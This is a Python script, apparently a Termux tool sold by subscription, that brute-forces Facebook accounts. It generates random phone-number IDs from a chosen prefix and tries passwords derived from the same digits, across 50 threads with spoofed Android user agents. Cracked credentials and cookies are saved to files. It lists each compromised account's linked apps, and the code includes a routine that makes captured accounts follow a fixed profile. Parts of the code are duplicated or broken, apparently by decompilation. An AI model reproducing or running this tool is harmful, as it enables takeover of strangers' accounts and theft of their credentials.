#Noob Programmer: Mumit Islam Himu
# Facebook: Mumit Islam (Himu)
# Github: Demon-Cyber-404
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
xr = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://facebook.com/groups/termuxteambd/')
logo = """  \033[1;92m
\033[1;92m╔═════════════════╗
\033[1;93m ASSALAMUALAIKUM\033[1;32m
\033[1;92m═══════════════════
\033[1;92m══════════════════════════════════════════
\033[1;32m███╗   ███╗ █████╗ ██╗███╗  ██╗██╗   ██╗██╗     
\033[1;32m████╗ ████║██╔══██╗██║████╗ ██║██║   ██║██║     
\033[1;32m██╔████╔██║███████║██║██╔██╗██║██║   ██║██║     
\033[1;32m██║╚██╔╝██║██╔══██║██║██║╚████║██║   ██║██║     
\033[1;32m██║ ╚═╝ ██║██║  ██║██║██║ ╚███║╚██████╔╝███████╗
\033[1;32m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚══╝ ╚═════╝ ╚══════╝
\033[1;92m══════════════════════════════════════════       
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PERSONAL 
\033[1;32m[-] VERSION   :\033[1;32m 0.1
\033[1;32m[-] AUTHOR    :\033[1;32m MAINUL ISLAM
\033[1;32m[-] GITHUB    :\033[1;32m MAINUL ISLAM
\033[1;32m[-] FACEBOOK  :\033[1;32m MAINUL ISLAM
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m MY NAME IS MAINUL[1;91m═══>\033[1;92m"""

loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)


ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    


def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hasan = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :hasan = ' ~> 2009'
        elif uid[:8] in ['10000000']        :hasan = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hasan = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hasan = ' 2010'
        elif uid[:6] in ['100001']          :hasan = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hasan = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :hasan = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :hasan = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hasan = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :hasan = ' ~> 2015'
        elif uid[:5] in ['10001']           :hasan = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :hasan = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :hasan = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :hasan = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :hasan = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:hasan = ' ~> 2021'
        elif uid[:5] in ['10008']           :hasan = ' ~>2022'
        elif uid[:5] in ['10009']           :hasan = ' ~> 2023'
        else:hasan=''
    elif len(uid) in [9,10]:
        hasan = ' ~> 2008/2009'
    elif len(uid)==8:
        hasan = ' ~> 2007/2008'
    elif len(uid)==7:
        hasan = ' ~> 2006/2007'
    else:hasan=''
    return hasan
    

def xnxx():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(' \033[0;97m[\033[0;92m+\033[0;97m] EXAMPLE: \033[0;92m0191,0172,0183,0164\033[0;97m')
    print(" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [\033[0;92m!\033[0;97m] \033[1;91menter 4 digit sim code\033[0;97m')
    code = input(f' [\033[0;92m?\033[0;97m] CHOOSE : ')
    #os.system('xdg-open https://facebook.com/groups/termuxteambd/')
    os.system('clear')
    print(logo)
    limit = int(input('\033[0;97m[\033[0;92m+\033[0;97m]\033[0;92m EXAMPLE : \033[0;92m2000, 5000, 10000, 50000 \n\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n\033[0;97m[\033[0;92m?\033[0;97m] \033[0;92mPUT LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('[\033[0;92m+\033[0;97m]\033[1;95m Total Ids : \033[0;92m'+tl)
        jalan('\033[0;97m[\033[0;92m+\033[0;97m]\033[1;92m Use Flight Mode Before Use ')
        jalan('\033[0;97m[\033[0;92m+\033[0;97m] \033[1;92mWait For Successfull Ids.....')
        jalan('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print("\n\033[0;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def rcrack(uid,pwx,tl):
    
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            "method": 'POST',
            "path": '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
            "scheme": 'https',
            'accept': 'application/x-www-form-urlencoded',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;92m[\033[1;92mMAINUL-SUCCESSFULL\033[1;91m] \033[1;92m'+uid+' | \033[1;92m' +ps+  '')
                cek_apk(session,coki)
                open('/sdcard/mainul-success.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[1;91m[\033[0;94mMAINUL-CHECKPOINT\033[1;91m] \033[0;97m' +uid+ ' \033[1;91m|\033[0;97m ' +ps+           '  \33[0;97m')
                open('/sdcard/mainul-checkpoint.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;92mMAINUL ISLAM\033[0;97m][%s|%s][OK:\033[0;92m%s\033[0;97m]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass


def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://pastebin.com/M6MTdv2n").text
	if key1 in r1:
		os.system('clear')
		o()
	else:
		os.system("clear")
		print(logo)
		print("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92mYOUR ARE NOT A PREMIUM USER")
		time.sleep(0.0009)
		print("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92mPREMIUM TOPUP LIST")
		print("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92m7 DAYS 200 TAKA")
		print("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92m15 DAYS 400 TAKA")
		print("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92mYour Key  :\033[1;94m "+ak+𝐘𝐎𝐔𝐒𝐔𝐅+key1)
		name = input("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92mYour Name : ")
		input("    \033[93;1m[\033[92;1m•\033[93;1m]\33[0;92mPress Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+𝐘𝐎𝐔𝐒𝐔𝐅+''+key1
		os.system('am start https://wa.me/+8801317481984?text=' + tks)
		Subscraption() 
#Subscraption()

xnxx()